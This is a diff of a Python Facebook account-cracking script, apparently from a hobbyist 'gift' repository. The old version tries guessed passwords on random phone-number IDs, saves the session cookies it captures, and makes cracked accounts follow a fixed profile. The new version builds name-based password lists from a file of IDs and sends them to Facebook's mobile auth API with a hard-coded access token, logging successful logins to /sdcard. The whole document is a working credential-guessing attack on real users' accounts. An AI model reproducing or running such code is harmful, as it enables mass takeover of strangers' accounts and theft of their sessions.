@@ -1,283 +1,216 @@
-#-------------------------------------------------------------
-#Don't Forget To Follow My Github &
-#Sent Star This Repositories 🙂
-#-------------------------------------------------------------
-#10K-Gift-Test-Coding
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("git pull")
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
-from datetime import date
-from datetime import datetime
-from time import sleep
-from time import sleep as waktu
+#---EHC CYBER 99 (GOXDIES)
+#Open-source-01 (Gift)
+#-----------------------------------
+import os, random, sys, json, uuid, time
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
 try:
     import requests
-    from concurrent.futures import ThreadPoolExecutor as ThreadPool
-    import mechanize
-    from requests.exceptions import ConnectionError
-except ModuleNotFoundError:
-    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
-    os.system('pip install bs4')
-from time import localtime as lt
-from os import system as cmd
-ltx = int(lt()[3])
-if ltx > 12:
-    a = ltx-12
-    tag = "PM"
-else:
-    a = ltx
-    tag = "AM"
-#-----[Global Functions]-----#
-def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
-#-----[Colours]-----#
-RED = '\033[1;91m' #
-WHITE = '\033[1;97m' #
-GREEN = '\033[1;32m' #
-YELLOW = '\033[1;33m' #
-BLUE = '\033[1;34m' #
-ORANGE = '\033[1;35m' #
-P = '\x1b[1;97m' # 
-M = '\x1b[1;91m' # 
-H = '\x1b[1;92m' # 
-K = '\x1b[1;92m' # 
-B = '\x1b[1;94m' # 
-U = '\x1b[1;95m' # 
-O = '\x1b[1;96m' #
-N = '\x1b[0m' #
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-my_color = [
- P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
-now = datetime.now()
-dt_string = now.strftime("%H:%M")
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-today = date.today()
-mtd,cp_cpx,cokix=[],[],[]
-ugen2=[]
-ugen=[]
-#-----[App Checker]-----#
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
-    else:
-        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-        #else:
-            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
-    else:
-        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print('')
+except:
+    os.system("pip install requests -y")
+    import requests
 
-def follow(self, session, coki):
-        r =
-        BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100089093046100',
-        {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
-        get = r.find('a', 'Ikuti', **('string',)).get('href')
-        session.get('https://mbasic.facebook.com' + str(get), {
-            'cookie': coki }, **('cookies',)).text
-           
-#-----[UserAgent]-----#
-for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
-         
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.001)
-#-----[Logo]-----#
-logo = ("""
-\033[1;91m    _____   ___   ______  _____________   ________
-\033[1;92m   /  _/ | / / | / / __ \/ ____/ ____/ | / /_  __/
-\033[1;93m   / //  |/ /  |/ / / / / /   / __/ /  |/ / / /   
-\033[1;94m _/ // /|  / /|  / /_/ / /___/ /___/ /|  / / /    
-\033[1;95m/___/_/ |_/_/ |_/\____/\____/_____/_/ |_/ /_/     \033[1;92m
- ┌─────────────────────────────────────────┐
- │ [✓] TOOL     : RANDOM CRACK             │
- │ [✓] STATUS   : FREE                     │
- │ [✓] VERSION  : MODIFIED                 │
- └─────────────────────────────────────────┘""")
-try:
-   print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
-   v = 5.2
-   update = ('5.2')
-   update = ('5.2')
-   if str(v) in update:
-       os.system('clear')
-   else:pass
-except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
-
-def linex():
-        print('\033[1;37m ──────────────────────────────────────────')
- 
-def clear():
+li="\033[38;5;46m="
+cox=str(f"{li}"*37)
+logo=f"""
+ ▄▄▄       ██▀███  ▄▄▄█████▓
+▒████▄    ▓██ ▒ ██▒▓  ██▒ ▓▒
+▒██  ▀█▄  ▓██ ░▄█ ▒▒ ▓██░ ▒░
+░██▄▄▄▄██ ▒██▀▀█▄  ░ ▓██▓ ░ 
+ ▓█   ▓██▒░██▓ ▒██▒  ▒██▒ ░ 
+ ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ▒ ░░   
+  ▒   ▒▒ ░  ░▒ ░ ▒░    ░    
+  ░   ▒     ░░   ░   ░      
+      ░  ░   ░              
+\033[38;5;46m================================="""
+def logox():
     os.system('clear')
     print(logo)
-    
-#-----[Loop Menu]-----#  
-loop = 0
-oks = []
-cps = []
 
-#-----[Main-Menu]-----#
-def mumit_menu():
-    os.system('clear');print(logo)
-    print('\033[1;92m [1] RANDOM CRACK')
-    print('\033[1;92m [0] EXIT TOOL')
-    linex()
-    mumit=input(' \033[1;32m[?] SELECT MENU: ')
-    if mumit in['1','01']:innocent()
-    elif mumit in['0','00']:exit()
-    else:exit()
-    
-def innocent():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;32m [√] SIM CODE : 099, 063')
-    linex()
-    code = input('\033[1;32m [?] CHOOSE : ')
-    os.system('clear')
-    print(logo)
-    print('\033[1;32m [•] EXAMPLE : 100-3000')
-    linex()
-    limit = int(input('\033[1;32m [?] CHOOSE : '))
-    linex()
-    xd_cp=input(f'\033[1;32m [?] YOU WANT TO SHOW CP ACCOUNT?[\033[1;32mY\033[1;34m/\033[1;31mN\033[1;32m]: ')
-    if xd_cp in ['y','Y','yes','Yes','1']:cp_cpx.append('y')
-    else:cp_cpx.append('n')
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with ThreadPool(max_workers=50) as ahare:
-        clear()
-        tl = str(len(user))
-        print('\033[1;32m [+] CHOICE CODE: '+code)
-        print('\033[1;92m [+] PROGRAM STARTED...')
-        print('\033[1;92m [!] USE FLIGHT MODE FOR SPEED UP')
-        linex()
-        for fuck in user:
-            pwx = [fuck,'bangladesh']
-            uid = code+fuck
-            ahare.submit(mumitx,uid,pwx,tl)
-    print('CRACK PROCESS HAS BEEN COMPLETED ')
-    print('OK IDS: /GXJO-OK.txt')
-    print('CP IDS: /GXJO-CP.txt')
-    linex()
-    
-def mumitx(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
+def main():
+    logox()
+    print("  [A] FILE CLONE  |  [B] EXIT TOOL")
+    print(cox)
+    want=input("  [•] CHOOSE: ")
+    if want in ["A","a","1","01"]:
+        file_iclone()
+    elif want in ["B","b","2","02"]:
+        print(cox)
+        print("  [•] K, BYE.")
+        print(cox)
+        sys.exit()
+    else:
+        print(cox)
+        print("  [X] CHOOSE A RIGHT OPTION.")
+        print(cox)
+        time.sleep(3)
+        main()
+
+def file_iclone():
+    print(cox)
+    fl=input("  [✓]\033[38;5;46m FILE PATH: ")
+    print(cox)
+    try:
+        fileeee=open(fl,"r").read().splitlines()
+    except:
+        print("  [✓] \033[38;5;46mFILE NOT FOUND.")
+        print(cox)
+        sys.exit()
+    auto_pass(fileeee)
+
+
+
+def auto_pass(fileeee):
+    tl=str(len(fileeee))
+    print("  [•] TOTAL ID IN FILE: "+tl)
+    print(cox)
+    print("  [•] ID SAVED: /sdcard/GOXDIES.txt")
+    print(cox)
+    with ThreadPool (max_workers=120) as feel:
+        for data in fileeee:
+            uid=data.split("|")[0]
+            pwx=[]
+            pwx.append('57273200')
+            pwx.append('59039200')
+            nam=data.split("|")[1]
+            name=nam.lower()
+            try:
+                name1=name.split(" ")[0]
+                nam1=nam.split(" ")[0]
+                if len(name1) <3:
+                    pass
+                else:
+                    pwx.append(nam1+'123')
+                    pwx.append(name1+'12')
+                    pwx.append(name1+'123')
+                    pwx.append(name1+' 123')
+                    pwx.append(name1+'1234')
+                    pwx.append(name1+'12345')
+                    pwx.append(name1+'@123')
+                    pwx.append(name1+'pogi')
+                    pwx.append(name1+'ganda')
+                    pwx.append(name1+'143')
+                    pwx.append(name1+'@143')
+            except:pass
+            try:
+                mid_name=name.split(" ")[1]
+                nam2=nam.split(" ")[1]
+                if len(mid_name) <3:
+                    pass
+                else:
+                    pwx.append(nam1+" "+nam2)
+                    pwx.append(mid_name+'12')
+                    pwx.append(mid_name+'123')
+                    pwx.append(mid_name+' 123')
+                    pwx.append(mid_name+'1234')
+                    pwx.append(mid_name+'12345')
+                    pwx.append(mid_name+'@#')
+                    pwx.append(mid_name+'@@')
+                    pwx.append(mid_name+'@')
+                    pwx.append(mid_name+'@123')
+                    #-Mix
+                    pwx.append(name1+mid_name)
+                    pwx.append(name1+mid_name+'143')
+                    pwx.append(name1+mid_name+'12')
+                    pwx.append(name1+mid_name+'123')
+                    pwx.append(name1+mid_name+'1234')
+                    pwx.append(name1+mid_name+'12345')
+                    pwx.append(name1+mid_name+'@#')
+                    pwx.append(name1+mid_name+'@@')
+                    pwx.append(name1+mid_name+'@')
+                    pwx.append(name1+mid_name+'@123')
+                    pwx.append(name1+' '+mid_name)
+                    pwx.append(name1+' '+mid_name+'123')
+                    pwx.append(name1+' '+mid_name+'143')
+                    pwx.append(name1+' '+mid_name+'1234')
+                    pwx.append(name1+' '+mid_name+'12345')
+            except:pass
+            try:
+                sur_name=name.split(" ")[2]
+                nam3=nam.split(" ")[2]
+                if len(sur_name) <3:
+                    pass
+                else:
+                    pwx.append(sur_name+'123')
+                    pwx.append(sur_name+'1234')
+                    pwx.append(sur_name+'12345')
+                    pwx.append(name1+mid_name+sur_name)
+                    pwx.append(name1+mid_name+sur_name+'123')
+                    pwx.append(name1+mid_name+sur_name+'1234')
+                    pwx.append(name1+mid_name+sur_name+'12345')
+                    pwx.append(name1+mid_name+sur_name+'@#')
+                    pwx.append(name1+mid_name+sur_name+'@@')
+                    pwx.append(name1+mid_name+sur_name+'@')
+                    pwx.append(name1+' '+mid_name+' '+sur_name)
+                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
+            except:pass
+            feel.submit(file_subb,uid,pwx)
+loop=0
+oks=[]
+cps=[]
+def file_subb(uid,pwx):
+    global oks,loop,cps
+    sys.stdout.write(f"\r  \033[38;5;46m[GOXDIES] {loop}|{str(len(oks))}");sys.stdout.flush()
+    session=requests.Session()
     try:
         for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-    'method':'POST',
-    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-    'scheme':'https',
-    'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'x-asbd-id': '198387',
-    'x-fb-lsd': 'AVoPmsopEAk',
-    'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[GXJO-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
-                cek_apk(session,coki)
-                open('/sdcard/GXJO-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
+            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
+            data = {
+            "adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "cpl": "true",
+            "family_device_id": str(uuid.uuid4()),
+            "credentials_type": "device_based_login_password",
+            "error_detail_type": "button_with_disabled",
+            "source": "device_based_login",
+            "email": uid,
+            "password": ps,
+            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+            "generate_session_cookies": "1",
+            "meta_inf_fbmeta": "",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": "en_GB",
+            "client_country_code": "GB",
+            "method": "auth.login",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "api_key": "882a8490361da98702bf97a021ddc14d"}
+            headers = {
+            'User-Agent': user_agent,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
+            q=json.loads(p)
+            if "session_key" in q:
+                print(f"\r\r  [OK] {uid} | {ps}      ")
+                open("/sdcard/GOXDIES-Ok.txt","a").write(uid+"|"+ps+"\n")
+                oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                if 'y' in cp_cpx: 
-                 print('\r\r\033[1;30m[GXJO-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
-                open('/sdcard/GXJO-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
-                break
+            elif "PLEASE, CONFIRM EMAIL: " in q:
+                print(f"\r\r। [OK] {uid} | {ps}      ")
+                open("/sdcard/GOXDIES-Ok.txt","a").write(uid+"|"+ps+"\n")
+                oks.append(uid)
+            elif "www.facebook.com" in q:
+                print(f"\r\r  [CP] {uid} | {ps}      ")
+                cps.append(uid)
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mGXJO\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
     except:
-        pass
+        time.sleep(4)
 
-#-----[Run Menu]-----#
-mumit_menu()
+main()
